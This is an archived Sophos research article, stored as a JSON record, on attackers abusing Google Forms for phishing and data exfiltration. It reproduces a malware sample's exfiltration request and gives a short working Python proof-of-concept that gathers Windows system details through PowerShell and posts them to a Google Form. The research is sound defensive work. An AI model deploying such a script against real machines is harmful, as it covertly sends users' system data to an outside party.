{
    "id": "51fc6d89-c71f-4c57-8386-d8a3939d4c18",
    "created_at": "2023-01-12T15:00:06.495159Z",
    "updated_at": "2025-03-27T02:05:18.782231Z",
    "deleted_at": null,
    "sha1_hash": "54424dcd871eefb674bd1677bfcae43731fc8e9c",
    "title": "2021-09-23 - Phishing and malware actors abuse Google Forms for credentials, data exfiltration",
    "authors": "",
    "file_creation_date": "2022-05-28T01:22:54Z",
    "file_modification_date": "2022-05-28T01:22:54Z",
    "file_size": 1093336,
    "plain_text": "# Phishing and malware actors abuse Google Forms for credentials, data exfiltration\n\n**news.sophos.com/en-us/2021/09/23/phishing-and-malware-actors-abuse-google-forms-for-credentials-data-**\nexfiltration/\n\nSean Gallagher September 23, 2021\n\nEarlier this year as we researched malware use of Transport Layer Security-based\ncommunications to conceal command and control traffic and downloads, we found a\ndisproportionate amount of traffic going to Google cloud services. Among the destinations we\nfound in telemetry were a host of Google Forms pages.\n\nThe abuse of legitimate public cloud services by malware is nothing new. We’ve seen\nmalware use Google Docs and Google Sheets as part of their infection chain and command\nand control systems in the past, much in the same way they make use of services like\nGitHub, Pastebin, Telegram and Discord. In each case, malicious actors use the web-based\ninterfaces of the service to either retrieve stored binaries, retrieve specific data that affects\ntheir performance, report results of execution or exfiltrate data from infected systems. Since\nGoogle Forms are protected by TLS, the contents of data submitted to forms can’t be\nchecked without the use of a web proxy, and the traffic otherwise looks like legitimate\ncommunications to a Google application.\n\nGoogle Forms abuse comes in a variety of forms. In some cases, Google Forms were used\nin rudimentary phishing attacks, attempting to convince victims to enter their credentials into\na form designed to look somewhat like a login page (despite Google Forms’ text on every\nform warning users not to enter passwords into them). Often these forms were tied to\nmalicious spam campaigns.\n\n\n-----\n\nWe also uncovered a number of malicious Android applications that made use of Google\nForms for user interface elements (though not for malicious purposes). And then there were\na few examples of malicious Windows applications that used web requests to Google Forms\npages to exfiltrate data from computers. For the purposes of demonstration, we reproduced\nthe exfiltration capability in a Python script using crafted web requests to push system data\nto a Google spreadsheet through Forms for aggregation.\n\n## Teaching a crook to phish\n\nMost sophisticated web phishing attacks use HTML that closely mimics the design of the\nsites of the services they target. But entry-level scammers can and do use Google Forms’\nready-made design templates to attempt to steal payment data through faked “secure” ecommerce pages, or create phishing forms that are believable if not examined too closely.\n\nOne of the largest sources of Google Forms links in spam were “unsubscribe” links in scam\nmarketing emails. But Sophos has intercepted a number of spam-based phishing campaigns\nthat targeted Microsoft online accounts, including Office 365, with the barest of efforts. The\nspam claimed that recipients’ email accounts were about to be shut down if they were not\nimmediately verified, and offered a link to perform that verification—a Google Forms link,\nleading to a form decorated with Microsoft graphics but still clearly a Google Form.\n\nThis email targeted Outlook.com and Hotmail users:\n\nClicking on the “update now” link leads to this Google Form:\n\n\n-----\n\nA similar recent spam campaign targets Office 365 users with a very bare-bones lure:\n\n\n-----\n\nThe phishing page behind the link is similarly bare-bones:\n\n\n-----\n\nIn both cases, any data entered into these forms gets stored in a Google Sheets document,\nready for export by the phishing campaign operator. Because the links are to\ndocs.google.com/forms—and they say “Google Forms” at the bottom, as well as warning\n\n\n-----\n\nNever submit passwords through Google Forms —they are easily distinguished as scams.\nStill, they apparently work frequently enough to warrant their continued use by scammers\nstealing business and personal email accounts.\n\n## Malware and potentially unwanted apps\n\nA number of likely malicious Android application packages were uncovered in our research\nthat use Google Forms as a way to capture data without having to code a back-end website.\nMost of these were potentially unwanted apps or apps that used components associated with\nAndroid adware, and they used Google Forms largely as part of their user-facing\nfunctionality. For instance, [SnapTube, a video app that monetizes itself for its developer](https://news.sophos.com/en-us/2019/02/26/special-report-sophisticated-ad-fraud-permeates-the-mobile-app-ecosystem/)\nthrough web advertising fraud, includes a Google Forms page for user feedback:\n\n\n-----\n\nIn these cases, the Google Forms page is displayed. However, we discovered some\npotentially unwanted applications targeting Windows users that used Google Forms pages\nsurreptitiously, assembling web requests programmatically and sending data without user\ninteraction. We also found evidence of PowerShell scripts interacting with Google Forms in\nour telemetry.\n\nOne sample we observed explicitly using Google Forms for data exfiltration was an\nexecutable named checkbrowser.exe. This file was delivered from a domain that appears to\nhave hosted a compromised Italian language WordPress blog (tecnopc.info). It is an AutoIT\ncompiled script; when executed, the program modifies Windows’ certificate trust list, makes\nchanges related to the Remote Access Service API, and removes settings in the Windows\nregistry related to Internet proxy settings and other Internet security policies.\n\nIn addition to these things, the AutoIT script also collects system data, including language\nsettings, mouse settings, and machine name. These appear to be part of sandbox evasion\nand to prevent execution in certain locales. It then exports some system information through\na secure HTTP request to docs.google.com that take the format of a Google Forms\nsubmission.\n\n\n-----\n\nI intercepted the request using Fiddler, and was able to get the URI for the form. A little bit of\nreformatting the request provided a look at the form itself:\n\nThe fields in the form (“client name”, computer name, user name, operating system version,\nInternet Explorer version) match up to the content in the POST request sent to the form:\n```\nGET /forms/d/16LSwmJnCIOAuNnOD631ki0wfe_4eu_PWMbCEI_6Uh24/formResponse?\nentry.1633051194=[user name if detected]&entry.1018322823=[computer\nname]&entry.328100715=[user name]&entry.1878239517=[Windows\nversion]&entry.1356961775=[Internet Explorer version number] HTTP/1.1\n\n```\nThe numbers of each entry in the GET request match up to numbers associated with the\ncontainers for each field in the remote form, as part of an array containing the parameters for\nthe form object.. For example, the <div> tag surrounding the entry for “client name” is:\n```\n<div jsmodel=\"CP1oW\" data-params=\"%.@.[321264449,\"Nome Cliente\";,null,0,[[1633051194,\n[],false,[],[],null,null,null,null,null,[null,[]]]],null,null,null,[]]......\n\n```\n\n-----\n\nThe first element of the array is the entry ID, 1633051194, which matches with the parameter\nin the GET request. In the cases we observed and in our testing, the value for this field was\nalways “Sconosciuto” (Italian for “unknown”).\n\nA similar strategy in another malware I found using a Russian-language Google form for\nexfiltration used a curl command to execute the post, posting video adapter, screen\nresolution and processor data.\n\n## Roll your own Google Forms exfiltration\n\nTo help understand how to hunt this sort of programmatic abuse of Google Forms, I decided\nto do some abusing of my own. All that’s required is a burnable Google account, a purposebuilt form, and code to grab local system data and paste it into an HTML POST request.\n\nI created a form with my Google account, and then opened the form with Firefox’s developer\ntools to identify the form entry identification numbers. A\n\nTo get the actual form submission format, I entered some test data, and viewed the data from\nFirefox’s console:\n\n\n-----\n\nThe only necessary form data are the\n\nones named “entry.[number]” — you don’t have to include the others in your POST request.\n\nWith the proper form entry IDs identified, I wrote a quick Python script to scrape some\nWindows system information and and dump it to the form. Using Python’s subprocess library,\nI passed some PowerShell commands to the operating system:\n```\nimport requests, os, sys, subprocess\nresult1 = subprocess.run('powershell Get-ComputerInfo \"*version\"',\nstdout=subprocess.PIPE)\nresult2 = subprocess.run('powershell Get-CimInstance -ClassName\nWin32_ComputerSystem', stdout=subprocess.PIPE)\nresult3 = subprocess.run('powershell whoami', stdout=subprocess.PIPE)\nurl = 'https://docs.google.com/forms/d/e/[Google Forms app ID]/formResponse'\nexfil = {'entry.[first entry ID number]': result1, 'entry.[second entry ID number]' :\nresult2, 'entry.[third entry ID number]' : result3}\nx = requests.post(url, data = exfil)\nprint(x.text)\n\n```\nThe print command returns the HTML result of the POST.\n\nThe data passed to the form can be viewed in its associated spreadsheet:\n\n\n-----\n\nWith just a few lines of script, I had a (very rough) functional exfiltration tool. This could easily\nbe executed completely in PowerShell, or in any other scripting language.\n\n## Ease of misuse\n\nWhile the vast majority of Google Forms abuse remains in the low-skill phishing and fraud\nspam space, the potential for its use in data exfiltration and malware command and control\nremains high — if only because it is so easy to implement. While Google frequently closes\naccounts associated with high-volume abuse of applications, including Forms, targeted use\nof Forms by malware could go undetected.\n\nWe’ve seen growing abuse of Google and other legitimate cloud services by malware actors,\nand it’s easy to understand why: they’re widely trusted by organizations, they’re secured with\nTLS, and they’re essentially free infrastructure.\n\nSophos products defend against most malicious spam that carry Forms-based phishing\ncampaigns, and detect the behaviors of system information collection and exfiltration within\nthe technique used in the malware and sample discussed here. But email users should\nremain vigilant to attempts to use links to Google Forms (or other legitimate services) to\nobtain credentials. And organizations should not inherently trust TLS traffic to “known good”\ndomains such as docs.google.com.\n\n**SophosLabs acknowledges Jagadeesh Chandaraiah for his contribution to this report.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-23 - Phishing and malware actors abuse Google Forms for credentials, data exfiltration.pdf"
    ],
    "report_names": [
        "2021-09-23 - Phishing and malware actors abuse Google Forms for credentials, data exfiltration.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535606,
    "ts_updated_at": 1743041118,
    "ts_creation_date": 1653700974,
    "ts_modification_date": 1653700974,
    "files": {
        "pdf": "https://archive.orkl.eu/54424dcd871eefb674bd1677bfcae43731fc8e9c.pdf",
        "text": "https://archive.orkl.eu/54424dcd871eefb674bd1677bfcae43731fc8e9c.txt",
        "img": "https://archive.orkl.eu/54424dcd871eefb674bd1677bfcae43731fc8e9c.jpg"
    }
}